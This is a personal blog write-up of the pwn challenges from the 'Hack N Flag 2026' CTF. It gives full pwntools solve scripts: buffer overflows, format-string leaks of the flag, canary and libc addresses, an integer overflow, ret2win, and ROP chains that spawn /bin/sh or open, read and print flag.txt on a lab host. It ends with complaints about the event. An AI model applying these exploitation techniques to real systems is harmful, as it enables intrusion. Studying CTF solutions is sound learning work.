---
date: 2026-11-07
title: "Hack N Flag 2026"
tags: ["pwn"]
draft: false
---
# intro
Hi, short blogpost this time. I kinda just shadow pwned / webbed for my friend, and ngl a lot of the challenges was just if you lifted a surface level pwntools / SSTI / SQLi challenge and vibe coded it. I dunno if like. there was much effort put into them, but nice try anyways :? i'll just cover the pwns, theres nothing much to it unfortunately 

### precision of control
```python
from pwn import *

elf = context.binary = ELF("./chall")
# p = process(elf.path)
p = remote("10.10.10.12", 8070)
p.recvuntil(">")
# gets doesnt lengthcheck, overwrite fake flag n enabled
# stack layout is in ida
#   char s1[39]; // [rsp+0h] [rbp-30h] BYREF
# char v5[9]; // [rsp+27h] [rbp-9h] BYREF

# write:
# flag
# nullbyte (strcmp)
# smash stack up to v5
# overwrite disabled to enabled

payload = (
    b"HNF26{Fl4gg3d_F14g}"
    + b"\x00"
    + b"A" * (39 - len(b"HNF26{Fl4gg3d_F14g}") - 1)
    + b"enabled"
)

p.sendline(payload)

p.interactive()

# HNF26{pr3c1510n_15_c0nt40l}
```

* nothingburger, just a few variable checks before it let u pop shell, so strcmp stops at a nullbyte. so put a nullbyte, then smash stack, then the enabled variable 

### supercoolflagchecker 
```python
from pwn import *

flag = b""

for i in range(22, 27):
    p = remote("10.10.10.12", 8020)
    p.sendlineafter(b"Check a flag:", f"%{i}$p".encode())
    p.recvuntil(b"The flag:")

    leak = p.recvline().strip()
    p.close()

    if leak == b"(nil)":
        break

    flag += p64(int(leak, 16))

    if b"}" in flag:
        break

print(f"{flag.split(b'}')[0].decode() + '}'}")
# HNF26{d0nt_f0rg3t_y0ur_f0rm4t_sp3cif13rs!}
```
i tested this locally with a flag, but basically it read a flag into stack memory and had a fstring leak 

* use pwndbg tele to break, read the slots down which showed AAA, (22) then keep going until it ended
* i just for looped until it read the end

### flageconomy
```python
from pwn import *

elf = context.binary = ELF("./economy-simulator")

# p = process(elf.path)
p = remote("10.10.10.12", 8090)

# 1337 dola
p.recvuntil("\n")
p.sendline("1")
p.recvuntil(">")
p.sendline("3")
p.recvuntil(">")
p.sendline("2147483648")
p.interactive()

# HNF26{1m4g1n3_br34k1ng_th3_m4rk3t_f0r_4_f14g_c4nt_b3_m3}
```
* it was a shop and there was a ability to buy stuff. the initial check only checked if u could buy 1 of something, not n of something.
* so choose something less than 1337, then choose like a shit ton of it then it'll give you free money 

### ret2win 
do i even need to say anything. it's just a ret2win, like at least b creative w the naming 
```python
from pwn import *

elf = context.binary = ELF("./chall")

# p = process(elf.path)
p = remote("10.10.10.12", 8030)

p.recvuntil("\n")

# problem: strlen checks until first nullbyte
# fgets does not read until the first nullbyte
# so send 1 nullbyte to appease strlen, then send bof

# fgets is 200 into 0x70 (112) buffer, rbp 8 bytes -1 (nullbyte)
payload = b"\x00" + b"A" * (112 + 7) + p64(elf.sym.win)

p.sendline(payload)

p.interactive()
# HNF26{l3ngth_ch3ck_wh0?}
```

### THE COOL CHALLENGE!! electric eyes
ok!! so the first thing you notice upon throwing it into IDA is that . There Are No Libc symbols. it's statically linked! and also stripped, so too bad i guess 

IDA shows that it checks for a magic:
```c
  sub_401A10();
  sub_401AA0();
  sub_40C580("The eye shall see your image");
  qword_4B3B10 = mmap(0x1000000u);
  if ( sub_40C420(&v22, 1, 8, off_4B26D8) != 8 || v22 != 0xA1A0A0D474E5089LL )
LABEL_18:
    sub_4019F0();
```

and if you google it, it says that it's a png header. So! it's a png decoder, and it parses the headers (with something wrong somewhere). but where!

so i went to annotate the libc stuff i saw, which is ok because most just end up in syscall wrappers anyway. 

the important part is that while parsing the IHDR of the png data after the header, it just memcpys stuff into a 10 byte buffer without any checks:

```c
__int64 __fastcall sussy(__int64 a1, unsigned int a2)
{
  __int64 result; // rax
  _BYTE v3[10]; // [rsp+2h] [rbp-16h] BYREF
  __int16 v4; // [rsp+Ch] [rbp-Ch]
  unsigned __int8 v5; // [rsp+Eh] [rbp-Ah]

  memcpywrapper(v3, a1, a2);
  result = (unsigned __int8)v4;
  LOBYTE(result) = HIBYTE(v4) | v4;
  if ( v4 || v5 > 1u )
    fail();
  return result;
}
```

so there's the kaboom! so it's back to normal rop, except because its statically compiled there was 0 `/bin/sh` string. need a way to write that! but how? 

solution: the binary actually reads() from the buffer until it's done, so it's possible to just put in `/bin/sh\x00` string right after the stack smash, then the payload to ROP 

this doesn't work half the time on remote because.... i dont know actually ?? like all i rmb was that it was super damn laggy like PMO even shell was bugging out so i js cat flag.txt instead 

solve:
```python
import zlib

from pwn import *

elf = context.binary = ELF("./chall")

context.terminal = [
    "zellij",
    "action",
    "new-pane",
    "-d",
    "right",
    "-c",
    "--",
    "bash",
    "-c",
]

# https://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html
# there's gold in your mouth what you say about me
magic = b"\x89PNG\r\n\x1a\n"


def png_chunk(kind, data):
    assert len(kind) == 4
    crc = zlib.crc32(kind + data) & 0xFFFFFFFF
    return len(data).to_bytes(4, "big") + kind + data + crc.to_bytes(4, "big")


ihdr = bytearray()
ihdr += (1).to_bytes(4, "big")  # width
ihdr += (1).to_bytes(4, "big")  # height
ihdr += bytes([8, 2, 0, 0, 0])  # bit depth, colour type, comp, filter, interlace
# LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
# ──────[ REGISTERS / show-flags off / show-compact-regs off ]──────
#  RAX  0
# *RBX  0x100
# *RCX  0x16437aa0 ◂— 0
# *RDX  0x100
# *RDI  0x7ffd84936012 ◂— 0x100000001000000
# *RSI  0x164379a0 ◂— 0x100000001000000
# *R8   0x8bce95
# *R9   0x6ece24da
# *R10  0x19857464
# *R11  0x42
# *R12  0x100
#  R13  0
# *R14  0x7ffd84936058 ◂— 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
# *R15  0x7ffd84936044 ◂— 0x4242424242424242 ('BBBBBBBB')
# *RBP  0x164379a0 ◂— 0x100000001000000
# *RSP  0x7ffd84936030 ◂— 0x4242424242424242 ('BBBBBBBB')
# *RIP  0xcccccccc
rop = ROP(elf)

pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
# syscall = rop.find_gadget(["syscall"]).address this is terrible bc its syscall hlt
# 0x0000000000412352: syscall; ret;
syscall = 0x412352
pop_rdx_rbx_ret = 0x45E8B7

# [INFO] File: ./chall
# 0x000000000045e8b7: pop rdx; pop rbx; ret;
# ret so add sum bullshit to pad


payload2 = flat(
    pop_rax_ret,
    0,
    pop_rdi_ret,
    0,
    pop_rsi_ret,
    elf.bss() + 0x800,
    pop_rdx_rbx_ret,
    8,
    0,
    syscall,
    # read from stdin / stream into bss start
    # write /bin/sh there
    # after that, execve from bss start with gadgets
    pop_rax_ret,
    59,
    pop_rdi_ret,
    elf.bss() + 0x800,
    pop_rsi_ret,
    0,
    pop_rdx_rbx_ret,
    0,
    0,
    syscall,
)

ihdr += b"A" * (22 - len(ihdr))
# ihdr += p64(0xCCCCCCCC)  # rip
ihdr += payload2
ihdr += b"B" * (0x100 - len(ihdr))


payload = magic
payload += png_chunk(b"IHDR", bytes(ihdr))
# next read() syscall will read from the stream instead of idat so put here instead of putting into stdin
payload += b"/bin/sh\x00"
# payload += png_chunk(b"IDAT", zlib.compress(b"\x00\x00\x00\x00"))
# payload += png_chunk(b"IEND", b"")
# p = process(elf.path)
gdbscript = """"""
context.gdb_binary = "pwndbg"
# p = gdb.debug([elf.path], gdbscript=gdbscript)
p = remote("10.10.10.12", 8050, timeout=20)

p.send(payload)
print(repr(p.recvuntil(b"The eye shall see your image\n", timeout=15)))

p.sendline(b"cat flag.txt")
# p.send(b"/bin/sh\x00")
print(repr(p.recvrepeat(5)))
# p.interactive()

# HNF26{n0t_s0_4ll_kn0w1ng_af+3r4ll}

# todo: rewrite to not rely on stream being good
```

a better solve would be that instead of relying on it reading my /bin/sh, i use some other gadget to write /bin/sh into BSS instead of doing this wack ass workaround 

or! i use ORW:
1. open('./flag.txt')
2. read() to buffer 
3. write to stdout whats there 

the ROP chain would look something like this, ive tested it locally but i dunno about remotely

does what the above statements say ^^

```python
# open read write ROP
# step 1: write flag.txt to bss memory
# 00000000004688c3: mov qword ptr [rdi], rdx; ret;
# pop rbx doesnt matter, just pad w 0
thegadget = 0x4688C3
payload2 = flat(
    pop_rdi_ret,
    elf.bss() + 0x800,
    pop_rdx_rbx_ret,
    u64(b"./flag.t"),
    0,
    thegadget,
    # part 2, qwords are 8 bytes so remaining 2 + 6 null
    pop_rdi_ret,
    elf.bss() + 0x808,
    pop_rdx_rbx_ret,
    u64(b"xt\x00\x00\x00\x00\x00\x00"),
    0,
    thegadget,
    # ok, now bss region has flag, open()
    pop_rax_ret,
    2,
    pop_rdi_ret,
    elf.bss() + 0x800,
    pop_rsi_ret,
    0,
    pop_rdx_rbx_ret,
    0,
    0,
    syscall,
    # read()
    pop_rax_ret,
    0,
    pop_rdi_ret,
    3,
    pop_rsi_ret,
    elf.bss() + 0x900,
    pop_rdx_rbx_ret,
    64,
    0,
    syscall,
    # write()
    pop_rax_ret,
    1,
    pop_rdi_ret,
    1,
    pop_rsi_ret,
    elf.bss() + 0x900,
    pop_rdx_rbx_ret,
    64,
    0,
    syscall,
)


```

### finals: cage
* this is literally just stack canary + ret2libc, with another format string leak! 
* one thing i learned was how to use pwndbg to kind of figure out the position of stuff. so you firstly break at printf, then check the slots down in telescope until it shows your canary

example:
```bash
pwndbg> tele
00:0000│ rsp 0x7fffffffad88 —▸ 0x555555555282 (main+136) ◂— lea rax, [rbp - 0x20]
01:0008│-020 0x7fffffffad90 ◂— '%p.%p.%p.%p.%p.%p'
02:0010│-018 0x7fffffffad98 ◂— '.%p.%p.%p'
03:0018│-010 0x7fffffffada0 ◂— 0x70 /* 'p' */
04:0020│-008 0x7fffffffada8 ◂— 0xde1e21e1cb5ce500 ----------> THE CANARY
05:0028│ rbp 0x7fffffffadb0 —▸ 0x7fffffffae60 —▸ 0x7fffffffaec0 ◂— 0
06:0030│+008 0x7fffffffadb8 —▸ 0x7ffff7dad781 (__libc_start_call_main+129) ◂— mov edi, eax ---------> THE LIBC LEAK 
07:0038│+010 0x7fffffffadc0 —▸ 0x7ffff7fe0c60 (dl_main) ◂— endbr64
pwndbg> canary
AT_RANDOM  = 0x7fffffffb449 # overwritten after canary is sourced since glibc 2.44
TLS Canary @ 0x7ffff7d83768 # address where canary is stored
Canary     = 0xde1e21e1cb5ce500
Thread 1: Found valid canaries.
00:0000│-148 0x7fffffffac68 ◂— 0xde1e21e1cb5ce500
Additional results hidden. Use --all to see them.
```

so if u look at the left, it starts at slot 4, and remember that calling conventions of functions have 6 registers before being spilled to stack (which isnt a prob here)

printf uses the first one (RDI) so there are 5 left to be leaked 

so it's possible to calculate where canary is by just adding 4+5 = %9$p :D 

```bash
pwndbg> c
Continuing.
0x98243858fec69000
Something shifts inside the lock
```

the same thing can be done for leaking libc and leaking PIE slide, so now we know libc+129 is at 6+5 = %11$p you can calculate the slide

the PIE leak is all the way down, so js run tele 40 and see it:
```bash
10:0080│+058 0x7fffffffae28 —▸ 0x555555557dd8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555150 (__do_global_dtors_aux) ◂— endbr64
... snip
1c:00e0│+0b8 0x7fffffffae88 —▸ 0x555555557dd8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555150 (__do_global_dtors_aux) ◂— endbr64
```

0x10 + 5 = the 21nd slot , note that the 0x1c + 5 one can also work :3 

final solve:
```python
from pwn import *

elf = context.binary = ELF("./cage")
ld = "./ld-linux-x86-64.so.2"
libc = ELF("./libc.so.6")

p = process([ld, "--library-path", ".", elf.path])
gdbscript = """"""
context.gdb_binary = "pwndbg"

context.terminal = [
    "zellij",
    "action",
    "new-pane",
    "-d",
    "right",
    "-c",
    "--",
    "bash",
    "-c",
]

#
# p = gdb.debug(
#     [ld, "--library-path", ".", elf.path],
#     gdbscript=gdbscript,
# )
#

# p = remote("10.10.10.12", 8060)
p.recvuntil(b">")
p.sendline(b"%9$p.%11$p.%33$p")
p.recvuntil("0x")
leaks = p.recvline().strip().decode().split(".")
print(leaks)

canary = int("0x" + leaks[0], 16)
libc_leak = int(leaks[1], 16)
# pwndbg> x/16gx 0x7ffff7dac781
# 0x7ffff7dac781 <__libc_start_call_main+129>:    0xe8000198f8e8c789      0x88558d480006db53

pie = int(leaks[2], 16)

libc.address = libc_leak - 0x29CA8

elf.address = pie - elf.symbols["__do_global_dtors_aux_fini_array_entry"]

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address
binsh = next(libc.search(b"/bin/sh\x00"))

payload2 = flat(b"A" * 24, canary, b"B" * 8, ret, pop_rdi, binsh, libc.sym["system"])
p.sendline(payload2)
p.interactive()

# HNF26{Unc4g3d_@t_145t}
```

### last chall??
* it's just SROP. there's nothiing else to it, might as well google it because theres no fancy alarm() trick like the sctf one last year 

## criticism
the web challs were really really guessy, and i realised halfway in that the chall was just straight up guessing. Other issues include:
1. u had to guess the flag route (/api/flag) 
2. u had to guess the json body for jwt forgery 
3. u had to guess the route of the flag for another chall (app/flag.txt) and every other attempted file read didnt go through, so you kinda didnt know whether XXE was the intended solution
4. the infra was So. Fucking. Laggy. like pinging a api route took 5 seconds dude how was it this bad ESPECIALLY when you want people to do guessy challenges??
5. stream category was straight glaze
* firstly why was it even a challenge to open a ticket to beg a dude for a flag. what's the point here. why do i care about watching this ahh stream to get your flags (that didnt even have point decay until halfway in) 



